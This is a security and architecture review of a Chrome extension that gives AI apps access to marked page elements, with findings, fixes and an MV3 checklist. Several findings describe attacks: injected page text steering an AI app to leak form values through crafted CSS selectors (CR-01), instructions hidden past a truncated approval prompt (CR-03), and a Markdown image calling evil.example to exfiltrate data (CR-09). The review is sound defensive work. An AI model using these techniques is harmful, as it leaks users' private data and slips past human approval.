---
type: research
title: "Code review, November 2026: correctness, security, MV3 practice, architecture"
description: >-
  A read-through of Overmark at commit 1462d53 (service worker, content script, side
  panel, library): 15 findings (1 high, 2 medium, 12 low) and 6 unverified ones, what
  of a page can reach an AI app, an assessment of the architecture with five ranked
  restructurings, and a Manifest V3 checklist.
tags:
  - research
  - review
  - security
timestamp: 2026-11-13T00:00:00+01:00
---

# Code review, November 2026: correctness, security, MV3 practice, architecture

Reviewed 2026-11-13 at commit `1462d53` (main). All line numbers are of that commit.

How it was done: by reading the code paths end to end, with the design
([overview](../design/overview.md)) and the [decision log](../decision-log.md) beside
them. No test, build or browser was run, so nothing here was reproduced in Chrome: a
finding in the first table is one whose whole path was read, not one that was watched
failing. Platform claims that were looked up name their source; the others are marked
unverified. A decision the owner took on purpose is listed only where it causes a
concrete defect.

## 1. Findings

Severity: **high** breaks a stated security or privacy promise or loses data;
**medium** is a wrong outcome a user can meet in normal use, or a weakened safeguard;
**low** is narrow, cosmetic in effect, or needs an unlikely precondition.

| Id | Severity | Area | Where | Defect | Failure scenario |
|---|---|---|---|---|---|
| CR-01 | high | security | `src/lib/inspect.ts:1083`, `:1143`, `:100` | `get_mark_element` hands its `selector` to `closest` and `querySelector` unchecked, so the selector is an oracle for form state, and an `<option>` is returned with its `value`. | A case's mark is found on a page with a filled form. An AI app steered by injected page text calls `get_mark_element` with `html:has(input[name=iban][value^="CH9"])`: a result means yes, "Nothing around the mark's element matches" means no. A few silent, read-only calls per character spell out a prefilled value; `:checked` tells every radio button, checkbox and chosen option; `selector: "option:checked"` returns `<option value="CH">` outright. DEC-013 and PRIVACY.md promise that no field value leaves the page. |
| CR-02 | medium | mv3 | `src/content/overlay.ts:376`, `:391`; `src/content/index.ts:174` | A content script orphaned by an update or reload is not taken over: its 500 ms tick puts its overlay back after the new instance removed it, and its window listeners stay. | The toolbar is up with the Box tool on; the extension updates. The user clicks the icon: the new instance removes `#overmark-root`, and within 500 ms the orphan appends its own again. Two toolbars; the orphan's full-window capture layer still takes every pointer event wherever the new one has no tool on, so the page cannot be clicked until it is reloaded, and the reload asks "Leave site?" for drafts that can no longer be saved. |
| CR-03 | medium | security | `src/worker/questions.ts:26`, `:148`; `src/worker/tools.ts:984` | A question shows the first 4,000 characters of the arguments; `set_summary` takes 20,000, `add_finding` and `add_mark` 5,000. The user allows text they were not shown. | An AI app steered by page text calls `set_summary` with 3,900 harmless characters and then 16,000 of instructions for the developer's coding agent. The panel shows the harmless start and "…"; the user clicks Allow; the developer's AI app reads the whole summary "first", as the tool description tells it to. |
| CR-04 | low | security | `src/content/index.ts:117`; `src/lib/inspect.ts:1143`, `:1065` | The page check (`isPageUrl`) holds only for marks without an element. For a mark with an element, `selector` may name `html` or `body` on whatever tab is in front. | "Allow on all sites" is on, a case is open, the user switches to another site where one mark scores "probable". `get_mark_element` with `selector: "body"` returns the first 16 KB of that page's markup and text, without a question. |
| CR-05 | low | security | `src/lib/inspect.ts:96`, `:235` | Only `input`, `textarea` and `select` have an attribute allow-list; every other element keeps all attributes but a deny-list. Typed text that a page mirrors into a wrapper's attribute leaves the page. | An auto-growing text area's wrapper `<div data-replicated-value="what was typed">`, an Angular dev build's `ng-reflect-model`, a custom slider's `aria-valuetext`: all are sent in the markup of the element around the field. |
| CR-06 | low | security | `src/sidepanel/main.ts:217`; `src/worker/tools.ts:463` | `case:load` and `case:update` send the whole case (summary, comments, findings, user agent) into the content script of every tab the open case follows to; the page needs the marks' shapes, element details, numbers and the title. | With "Allow on all sites" and a case open, every site that comes to the front gets the case's texts into its renderer process. DEC-016 moved the settings out of `chrome.storage.local` because of exactly that reader, a compromised renderer in the content script's world. |
| CR-07 | low | security | `src/lib/save.ts:169`; `src/background.ts:166` | `case:save` spreads the content script's draft into the stored mark (`...rest`); `validateCase` then keeps its `author`, `resolution` and `findings`. | A compromised renderer of a page with a case loaded (it knows the case's id) saves a mark with `author: "ai"`, or with a finding whose `app.id` is `https://claude.ai/oauth` and no `imported` flag: an "own" finding that app may then edit, and that every reader takes for that app's. |
| CR-08 | low | security | `src/worker/connection.ts:558` | "Stop AI access" writes Keep AI access on off first and disconnects last; a failed write ends the command before the disconnect. | The disk is full (screenshots), the settings write throws `QuotaExceededError`: the panel shows the problem, the connection stays up, and the AI app's tools keep working after the user clicked Stop. |
| CR-09 | low | security | `src/lib/markdown.ts:31` | `case.md` quotes comments, findings and the summary with only `<` escaped: Markdown images and links in them stay live. | A finding holds `![](https://evil.example/?d=…)`. The developer opens `case.md` in a previewer (an editor, GitHub): the image is fetched, with whatever the URL carries. |
| CR-10 | low | security | `src/content/blur.ts:21`; `src/lib/tabs.ts:20`; `src/sidepanel/index.html:111` | Blur reaches the top document and its shadow roots, never an embedded frame; the panel's tooltip says "every form field" and "always" (PRIVACY.md does name the gap). | "Blur form fields" is on; the page has a payment form or an embedded sign-up form in an iframe. The user's screenshots and an AI app's `capture` show what was typed there. |
| CR-11 | low | correctness | `src/lib/export.ts:389`; `src/lib/zip.ts:222` | A file of all cases is read with two walks of the whole central directory per case (three with storing): quadratic in the number of entries. | A 20 MB zip of 65,535 folders, each with a tiny valid `case.json`, makes about 8.6 × 10⁹ header parses: the panel says "Importing…" for tens of minutes, with no way to stop but closing it. |
| CR-12 | low | correctness | `src/lib/store.ts:174` | `IdbStore` keeps one connection for good: no `onclose`, `onversionchange` or `onblocked`. `kv.ts` handles all three. | Chrome closes the cases' database under a worker that a WebSocket keeps alive for hours (site data cleared, a disk error): every tool and every save fails with `InvalidStateError` until the worker happens to restart. |
| CR-13 | low | correctness | `src/content/review.ts:98`, `:144` | A load that was replaced clears `#loading` although the load that replaced it, of the same case, is still running; an update meanwhile is then overwritten. | The panel's follow and an AI app's `load_case` load the same case at once; the user resolves a mark in that moment. `update` draws the new version, then the second load finishes and sets the old one: the mark shows as open until the next change. |
| CR-14 | low | correctness | `src/content/index.ts:79`; `src/worker/tools.ts:871` | The temporary mark of `add_mark` is a fixed window rectangle; between it and the capture (150 ms to settle, up to 600 ms in the queue) nothing checks that the page stood still. The user's own marks have that check (`#shotMoved`). | The user scrolls, or a lazy image above the element loads, in that moment: the screenshot shows the pin and box beside the element, and the crop is of the wrong place. |
| CR-15 | low | mv3 | `src/sidepanel/ai.ts:246`; `src/background.ts:65`; `src/worker/connection.ts:204` | An open panel reconnects its port 250 ms after each disconnect. A port without messages does not keep the worker alive, so with AI access off the worker stops and starts about every 30 s, and runs its whole start each time. | Panel open, AI access off, 300 cases, a sync folder: every 30 s the worker reads every case (`Sync.run`), reads every image key (`sweepPending`), messages every tab (`tellTabs`) and rewrites "Last synced". |

### Plausible, not verified

| Id | Area | Where | Suspected defect | What is missing to be sure |
|---|---|---|---|---|
| P-01 | correctness | `src/content/adding.ts:1474`; `src/lib/save.ts:198` | The worker stops after a save's transaction committed and before its answer. Adding to a case: the retry finds the number taken, renumbers and adds the same mark a second time. A new case: the retry fails with "the screenshot … is missing" though the case is saved. | Whether Chrome ever stops a worker with a pending message answer; it should not within 5 minutes. |
| P-02 | correctness | `src/lib/sync.ts:320`, `:355` | The worker stops between writing a case's file and recording it: the next run finds a file of that name it does not own and writes `name-2.overmark.zip` beside it. | The same question; the window is one IndexedDB write. |
| P-03 | mv3 | `src/worker/connection.ts:5` | The relay pings every 25 s and Chrome stops an idle worker after 30 s: 5 s of delay ends the connection, and a waiting question with it; the alarm reconnects within a minute. Chrome's own sample pings every 20 s. | Measured ping jitter of the hosted relay. |
| P-04 | correctness | `src/content/index.ts:297` | `__overmark` is set before `start()`. If `start()` throws (an XML or SVG document, where `attachShadow` on a non-HTML `div` should throw), every later injection is a no-op and the tab says "Could not reach the page" until reloaded. | Whether `attachShadow` throws there; not run. |
| P-05 | mv3 | `src/content/adding.ts:271` | Chrome installs an update when the worker is idle, which it is while the user draws. The drafts of every open toolbar are lost, and the toolbar says so only when a button is pressed ("Extension context invalidated"). | When exactly Chrome applies an update to an extension with open content scripts. |
| P-06 | mv3 | `scripts/build.ts:122` | Edge Add-ons gives the extension another ID than the Chrome Web Store's key does; the relay's allow list (DEC-006) then needs both. Nothing is tested in Edge. | An Edge build was never loaded. |

## 2. The high and medium findings

### CR-01: the selector of `get_mark_element` reads form state

`selectorProblem` (`src/lib/inspect.ts:1083`) refuses a selector only when it is not
valid CSS, uses `:has(` twice, or names nothing but `*`. `resolveSelector` then runs
`closestAcross(base, selector)` (`:1143`) and `firstMatch(base, selector, ok)`
(`:1146`), and for a mark without an element `firstMatch(doc, …)` (`:1156`). The
answer tells success from failure (`src/content/index.ts:148`), so any condition a
selector can state is a question the AI app can ask of the live page, with no
confirmation (the tool is `readOnlyHint`):

- `[value^="…"]` on an input: the `value` attribute, which server-rendered forms fill
  in (e-mail, address, IBAN). React also writes a controlled input's current value to
  that attribute (unverified here; React issue 11896 describes it), password fields
  included, so there it is what was typed. A selector list in `:is()` halves the
  alphabet per call.
- `:checked`, `:indeterminate`, `:placeholder-shown`, `:autofill`, `:valid`,
  `:invalid`: the live state, which `attributeValue` never writes.
- `option:checked` inside the mark's element resolves to the option itself.
  `markupOf` leaves its text out (`inInput`, `:264`), but `option` is not in `FIELDS`
  (`:100`), so `openTag` writes `value="CH"` and `selected`.

One `:has()` is enough for all of it, from any mark whose element was found:
`html:has(…)` is an ancestor.

Smallest fix, in `selectorProblem` and `resolveSelector`:

1. Refuse state pseudo-classes: `:checked`, `:indeterminate`, `:default`,
   `:placeholder-shown`, `:autofill`, `:valid`, `:invalid`, `:user-valid`,
   `:user-invalid`, `:in-range`, `:out-of-range`, `:focus`, `:focus-within`,
   `:focus-visible`, `:target`, `:visited`.
2. Allow attribute selectors only on names a field may keep (`FIELD_ATTRIBUTES`
   without `style`, plus `href`-free ones such as `class`, `id`, `role`, the test
   ids); refuse `[value…]`, `[checked]`, `[selected]`, `[aria-value…]` and every
   `data-*` that is not a test id.
3. Never resolve to an element inside a `select`, `textarea` or editor (`inInput`),
   and drop `value` and `selected` on `option` in `attributeValue`.

A test per bullet belongs in `test/inspect.test.ts`; today no test names `:checked` or
`[value`.

### CR-02: an orphaned content script comes back

`start()` removes the element `#overmark-root` it finds (`src/content/index.ts:174`)
with the comment that this takes the page over. The orphan is still running, though:
only its `chrome.runtime` calls fail. While its overlay was shown, `Overlay.#update`
keeps a 500 ms interval (`src/content/overlay.ts:376`) whose `#place()` appends the
host again whenever its parent is not the expected one (`:391` to `:396`), which is
true the moment it was removed. So the orphan's toolbar, its marks and, if a tool was
on, its full-window `.capture.active` layer are back within half a second. Its other
listeners were never removed either: the capturing `keydown` for Escape
(`src/content/adding.ts:257`), `beforeunload` (`:271`), `pagehide`, the scroll and
resize listeners and the reviewer's interval (`src/content/review.ts:121`).

The end-to-end test (`test/e2e/extension.test.ts:73`) plants an inert `<div
id="overmark-root">`, not a script with a timer, so it cannot see this.

Smallest fix: give the content script one teardown. Register every listener with one
`AbortController`'s signal, keep the interval ids, and call the teardown (abort, clear
the intervals, remove the host) from two places: at the top of the tick when
`chrome.runtime?.id` is `undefined`, and on a DOM event the new instance dispatches
before it builds its overlay (`document.dispatchEvent(new CustomEvent("overmark:takeover"))`).
A page can fire that event too; all it gains is closing the toolbar, which it can do
anyway by removing the element. The test should orphan a real instance: load the
extension, show the toolbar, reload the extension through `chrome.runtime.reload()`,
click the icon, and count the hosts after a second.

### CR-03: a question shows part of what it allows

`Questions.ask` cuts the arguments' JSON to `MAX_ARGS = 4000` characters
(`src/worker/questions.ts:148`) and the panel shows that in a `<pre>`
(`src/sidepanel/ai.ts:671`). The schemas allow more: `set_summary` 20,000
(`src/worker/tools.ts:984`), `add_finding` 5,000 (`MAX_FINDING`), `add_mark`'s
comment 5,000 (`:965`), `set_mark_status`'s note 20,000 (`:1032`). What follows the
cut is written unseen, and it is written where the next AI app is told to read first.

Smallest fix: show all of it. The panel has room for a scrolling `<pre>` (the longest
argument is 20,000 characters), so raise `MAX_ARGS` to the largest schema limit plus
the JSON around it, and keep the cut only for the notification, whose text should then
say "open the side panel to read all of it" when it was cut. If a cut must stay, say
how many characters are not shown and do not offer "Always allow" for that question.

### What reaches an AI app, in short

Not findings, but the questions the review was asked:

- **Stored details** (`src/lib/element.ts`): a real allow-list. Every field has its
  source and limit, attributes come only through `ATTRIBUTE_RULES`, text only through
  `pageText`, which skips fields and editors. No gap found.
- **Live reads** (`src/lib/inspect.ts`): an allow-list for `input`, `textarea` and
  `select` only; a deny-list for everything else, and all visible text. That is
  DEC-013; its holes are CR-01, CR-04 and CR-05.
- **Screenshots**: `capture` asks nobody and shows whatever tab is in front that
  Overmark may run on, form fields included unless "Blur form fields" is on (off by
  default). With "Allow on all sites" that is every tab. The markup path withholds
  what the screenshot path shows; that is the owner's decision (DEC-015, overview),
  and the largest thing a paired AI app can do without a question.
- **Marked as data**: every reading tool carries `untrustedContentHint`, and the
  server instructions say it (`src/worker/tools.ts:116`); only `get_mark_element` says
  it in the result itself (`PAGE_CONTENT_NOTE`). Error texts, which can carry a case's
  title or a stored app name, are not marked. Whether a client honours the hint is the
  client's.
- **Listeners**: every `onMessage` checks `sender.id`; the port checks the panel's
  path and that it is not in a tab (`src/worker/protocol.ts:151`); `capture` needs
  `sender.tab`; `cases:changed` and `sync:run` are taken only from an extension page
  (`src/background.ts:244`). No `onMessageExternal`, no `externally_connectable`. The
  panel takes `cases:changed` from a content script too (`src/sidepanel/main.ts:1463`);
  all it does is read the store again.
- **What a page can do to the overlay**: remove, hide or cover it (not preventable);
  see that it is there; fire a synthetic Escape, which commits an open comment
  (`src/content/adding.ts:257` does not check `isTrusted`); fire `click` or `input`
  to force new screenshots. It cannot read or drive the toolbar: the shadow root is
  closed in every build but the test build (`src/content/overlay.ts:265`, fixed at
  build time by `define`), `:host { all: initial !important }` beats page CSS, and no
  listener takes `postMessage`.
- **HTML injection**: none. No `innerHTML`, `insertAdjacentHTML` or `DOMParser` in
  `src/`; the panel builds with `h()` and text nodes, the overlay with
  `createElement`. A case's address is opened only when it is `http(s)`
  (`isWebPage`, `src/sidepanel/dom.ts:51`).
- **Import**: sizes are bounded before and while unpacking (`inflate` stops at the
  declared size, `src/lib/zip.ts:90`); entry names are only compared with the paths
  the validated case names, so there is no path to traverse; `validateCase` builds new
  objects from fixed keys, so nothing reaches a prototype. Images are checked by their
  WebP header only and decoded later, in the panel's `<img>` and the worker's
  `createImageBitmap`: a decoder bug would run in the extension's process. Numbers are
  only checked to be finite (a `dpr` of 0 or a negative width passes); nothing was
  found that this breaks.
- **Secret and settings**: in the worker's own IndexedDB, written before memory
  changes; relay addresses are `https`/`wss`, or `http` for loopback only
  (`src/worker/settings.ts:23`). Sound.

## 3. Architecture

### What holds up

- **The split.** Worker, content script, panel and library have clear jobs, and the
  trust boundary is where it should be: the content script can ask for five things
  (`WORKER_REQUESTS`), the AI commands go over one checked port, the store is the
  extension origin's. Nothing in the content script reaches storage.
- **The store's contract.** `updateCase` (read, change, write in one transaction, with
  the images) is used by every writer, the panel included. Concurrent writers from two
  contexts are safe by construction; this is the best decision in the code.
- **Pure cores with thin shells.** `match.ts`, `candidates.ts`, `case.ts`, `save.ts`,
  `sync.ts`, `follow.ts`, `card.ts`, `decide.ts`, `questions.ts`, `always.ts`,
  `keep-on.ts` take their dependencies as arguments and are tested without a browser.
  This is the pattern to extend.
- **`Latest`.** Thirty lines that remove a class of stale-result bugs; used
  consistently.

### What does not

- **"One state" is not one state any more.** DEC-010 and DEC-011 each replaced
  scattered flags by one object. Both have since grown a second, unmanaged state
  beside it:
  - `src/content/adding.ts` has `PageActivity` for the page, and about twenty
    private fields for the adding queue (`#ops`, `#queued`, `#failed`, `#added`,
    `#undoing`, `#finishing`, `#leftOut`, `#savingCase`, `#saveCalled`, `#saveForm`,
    `#shots`, `#shown`, `#views`, …). That queue is the most race-prone logic in the
    extension and has no unit test: `test/` imports only `lastMark` from the file.
  - `src/sidepanel/main.ts` has `PanelState`, and ten module variables for following
    a case (`drawn`, `drawing`, `loadTarget`, `loadsUnderWay`, `pendingLoad`,
    `hiddenOn`, `followed`, `refreshing`, `declinedSites`, `panelWindow`) with five
    `Latest`s between them. `followStep` is pure and tested; what it is fed is not.
  - `src/sidepanel/ai.ts` keeps its own state in a closure and draws the AI card and
    the questions itself, outside `view.ts`.
- **Two message protocols, checked differently.** The port's commands are parsed
  field by field (`parseCommand`). The one-off messages are checked by `type` alone
  (`isWorkerRequest`), and their fields are used as they come (CR-07). The answers are
  tied to their requests only by comments: `sendToTab<T>` is a cast the caller
  chooses.
- **Layering.** `src/worker/tools.ts:56` imports `shortUrl` from `src/sidepanel/dom.ts`
  (and with it a module of DOM helpers into the worker's bundle); `src/sidepanel/ai.ts`
  imports the protocol and the settings' constants from `src/worker/`. What both sides
  share belongs in `src/lib/`.
- **Duplicates.** The IndexedDB promise helpers exist twice (`store.ts:153`,
  `kv.ts:20`), and only one of the two handles a closed connection (CR-12).
  `broadcast` exists twice with different behaviour (`background.ts:133` also starts
  the sync, `connection.ts:127` does not). `cut` exists three times, counting code
  units in two and code points in one, against DEC-019. `isFound` means two things
  (`follow.ts:98`, `match.ts`). The capture gap is 600 ms in the worker and 620 ms in
  the page, each with its own constant.
- **Content script lifetime.** Nothing owns it: listeners and timers are added and
  never removed (CR-02).

### Restructurings, by payoff

| # | What | Pays | Cost | Risk |
|---|---|---|---|---|
| 1 | **A lifetime for the content script.** One object that owns every listener (one `AbortController`) and timer, with `dispose()`; `start()` disposes a predecessor and the tick disposes an orphan. | Fixes CR-02; makes the content script testable as "start, dispose, nothing left"; a place for P-04's guard. | Half a day to a day. | Low: additive. |
| 2 | **One typed, checked message contract in `src/lib/`.** Move `worker/protocol.ts` and the shared constants to `lib/`; a map from request type to answer type, so `sendToTab` and `ask` infer the answer; a parser for `WorkerRequest` like `parseCommand`; the trimmed case for the page (CR-06) defined here. | Fixes CR-06 and CR-07, removes the worker-to-panel import, turns "the comment says it answers `LoadResult`" into a compile error. | One to two days. | Low: types and parsers; the wire format stays. |
| 3 | **Take the adding queue out of `adding.ts`.** A class without DOM (`AddQueue`: queued, failed, added, undoing, finishing; `ask` and "take a screenshot" passed in), as `PageActivity` was taken out. | About 350 lines of the hardest logic get unit tests with a fake worker: number taken, case switched, Undo during an add, Done with failures. Today each of those needs a browser. | Two to three days. | Medium: it moves code that reviews have already found races in. Do it with the tests written first against the current behaviour. |
| 4 | **Put the follow state into one object.** `Follower` in `follow.ts` holding `drawn`, `drawing`, `loadTarget`, `pendingLoad`, `hiddenOn`, `followed` and its `Latest`s, with the tab calls passed in. | The interleavings PR 42's review found become unit tests; `main.ts` loses about 250 lines and its module state. | One to two days. | Medium, and badly timed: this code settled two days ago. Wait until the next change to it. |
| 5 | **One IndexedDB helper.** `openDb(name, version, upgrade)` with `onclose`, `onversionchange` and `onblocked`, used by `IdbStore` and `kv.ts`; `upgrade` written by `oldVersion`, ready for a version 2. | Fixes CR-12 and removes the copy; a schema change later will not be the first time this is thought about. | Half a day. | Low. |

Not worth doing:

- **Splitting `worker/tools.ts` (1,325 lines) by tool.** It is a flat list of fourteen
  independent definitions over shared helpers; nothing in it is tangled, and
  `test/tools.test.ts` covers it well. Splitting moves lines and pays nothing.
- **Splitting `sidepanel/view.ts` (1,650 lines) by view.** One render function per
  part of the panel, all reading one state. Long, not complex.
- **A framework or a state library for the panel.** `Panel.update` plus `render` does
  the job; the problem is the state kept outside it, which item 4 and moving `ai.ts`'s
  card into `PanelState` address.
- **Moving `main.ts`'s import and export actions out.** Cosmetic; do it only when
  touching them.

### What the tests miss

- `src/content/adding.ts`, `src/sidepanel/main.ts`, `src/background.ts` and
  `src/worker/connection.ts` have no unit tests at all; they are reached only through
  the end-to-end tests, which need a browser and are skipped without one locally.
- A real orphaned content script (CR-02), and an update while a toolbar is up (P-05).
- The selector's reach into form state (CR-01) and mirrored attributes (CR-05).
- A worker stopped in the middle of a save or a sync run (P-01, P-02):
  `restartWorker` is used between steps, never inside one.
- Hostile archives at scale (CR-11): the zip tests cover damage and bombs, not the
  number of entries.
- Embedded frames, in blur and in matching.
- Edge.

## 4. MV3 checklist

| Practice | Status | Shown by |
|---|---|---|
| Listeners registered synchronously at the top level of the worker | followed | `src/background.ts:73`, `:247`, `:288`, `:327` to `:350`; no top-level `await` |
| No state only in the worker's memory | followed, with small exceptions | Settings, secret and Always allow in IndexedDB (`src/worker/kv.ts`); the session flag and the Undo ledger in `chrome.storage.session` (`src/worker/settings.ts:53`, `src/lib/undo.ts`). Waiting questions die with the worker on purpose (`src/worker/connection.ts:86`). Lost and only cosmetic: the last AI call and the last problem (`connection.ts:155`, `:158`) |
| Alarms, not timers, for anything that must outlive the worker | followed | The one-minute alarm backs `KeepOn`'s `setTimeout` retries (`src/worker/keep-on.ts:105`, `src/worker/connection.ts:442`, `src/background.ts:329`) |
| Keeping the worker alive only by sanctioned means | followed | A WebSocket that carries messages; the library answers the relay's JSON pings, which counts as traffic (Chrome 116, [Use WebSockets in service workers](https://developer.chrome.com/docs/extensions/how-to/web-platform/websockets)). The margin is thin (P-03) |
| No needless worker restarts | not followed | The panel's port reconnect (CR-15); a port without messages does not reset the idle timer ([lifecycle](https://developer.chrome.com/docs/extensions/develop/concepts/service-workers/lifecycle)) |
| `return true` only when a listener answers later; promise APIs throughout | followed | `src/background.ts:268`; `src/content/index.ts:225`, `:237`, `:289` |
| Sender checked in every listener | followed | `src/background.ts:249`, `:291`; `src/content/index.ts:190`; `src/sidepanel/main.ts:1424`; `src/worker/protocol.ts:151` |
| Injection on demand with `activeTab` instead of declared content scripts | followed | `src/lib/tabs.ts:18`; the manifest has no `content_scripts` (`scripts/build.ts:88`) |
| Frames | not applicable to marking; a gap for blur | Top frame only (`src/lib/tabs.ts:20`). `activeTab` does not reach cross-origin frames ([activeTab](https://developer.chrome.com/docs/extensions/develop/concepts/activeTab), and a Chromium developer's answer on the chromium-extensions list), so blurring inside them is not possible without host access: blur the `<iframe>` element itself instead (CR-10) |
| Orphaned content scripts after an update or reload | not followed | CR-02; the test does not exercise it |
| `sidePanel.open()` inside the user's gesture | followed | `src/background.ts:80`, before any `await` |
| Optional permissions asked for in a click, before any `await` | followed | `src/sidepanel/main.ts:811`, `:837`, `:1224`; `src/sidepanel/download.ts:17`; `src/sidepanel/sync.ts:119` |
| Least privilege | followed | `activeTab`, no `tabs`, no install-time host access; `<all_urls>` and `downloads` optional (`scripts/build.ts:106`) |
| Dead permissions and code | one leftover | `chrome.storage.local` is touched only to set an access level and to delete an unreleased build's keys (`src/worker/connection.ts:103`, `src/worker/kv.ts:49`). Both can go; `storage` is still needed for the session area |
| Default CSP, no remote code, no `eval`, no dynamic `import()` in the worker | followed | No CSP key in the manifest; `splitting` off for the worker (`scripts/build.ts:148`); `test/worker.test.ts:645` |
| No `web_accessible_resources`, no `externally_connectable` | followed | `scripts/build.ts:88`; styles go in through a constructed sheet (`src/content/overlay.ts:271`) |
| `chrome.storage` and IndexedDB each where they fit | followed | DEC-016; blobs and the secret in IndexedDB, session flags in `storage.session` |
| IndexedDB connections that survive a close, and upgrades by version | half | `src/lib/kv.ts:51` yes; `src/lib/store.ts:174` no (CR-12); both create their stores without looking at `oldVersion` |
| `minimum_chrome_version` matches the APIs used | followed, as far as read | 116 for `sidePanel.open` and the WebSocket keep-alive; nothing newer found (`color-mix` 111, `deflate-raw` 103, `documentId` 106). Not run on Chrome 116 |
| Edge | unverified | No Edge-specific code and no Edge run; see P-06 |
| Store listing matches the behaviour | not followed in two rows | `kb/operations/chrome-web-store.md:130` says a notification has "Allow and Don't allow" and "Nothing changes without that answer"; since DEC-018 it has Allow and Always allow, and an always-allowed tool runs without one. `:136` says `<all_urls>` is asked for one site at a time when marks are shown and names "the case's Load button"; since DEC-022 only "Open the case's page" asks for a site (`src/sidepanel/main.ts:837`) and the Load button is gone. A justification that does not match the code is a review risk |
| Data leaving the browser is disclosed | followed | The relay, the frames gap and the editors are in PRIVACY.md and the listing. CR-01 makes "holds no form field values" untrue until fixed |

## 5. What was looked up, and what was not

Looked up on 2026-11-13 (search results read, the pages themselves not opened; the
links are under Citations):

- The service worker's lifecycle: a 30 s idle limit and 5 minutes per event; since
  Chrome 114 a message over a port resets the timer and opening a port does not
  (CR-15).
- WebSockets in service workers: from Chrome 116 a WebSocket that exchanges messages
  within the 30 s window keeps the worker alive (P-03).
- `activeTab` does not reach cross-origin frames: Chrome's and MDN's pages on the
  permission, and two threads on the chromium-extensions list (CR-10).

From memory, not looked up:

- React writes a controlled input's value to its `value` attribute (React issue
  11896): the password variant of CR-01. The server-rendered and `:checked` variants
  do not depend on it.
- Chrome gives a content script injected after an extension reload a new isolated
  world, so that `globalThis.__overmark` is unset and `start()` runs. CR-02 assumes
  it, as the code does. If it did not, `start()` would never run after a reload,
  which is worse.

# Citations

- [The extension service worker lifecycle](https://developer.chrome.com/docs/extensions/develop/concepts/service-workers/lifecycle)
- [Use WebSockets in service workers](https://developer.chrome.com/docs/extensions/how-to/web-platform/websockets)
- [The activeTab permission](https://developer.chrome.com/docs/extensions/develop/concepts/activeTab)
- [MDN: activeTab permission](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/activeTab_permission)
- [chromium-extensions: Dynamic insert into iframe with activeTab](https://groups.google.com/a/chromium.org/g/chromium-extensions/c/ovL4XoZi9Dk)
- [chromium-extensions: inject script in cross-domain iframe on action click](https://groups.google.com/a/chromium.org/g/chromium-extensions/c/bdSVIthv5-Q)
- [React issue 11896](https://github.com/facebook/react/issues/11896)
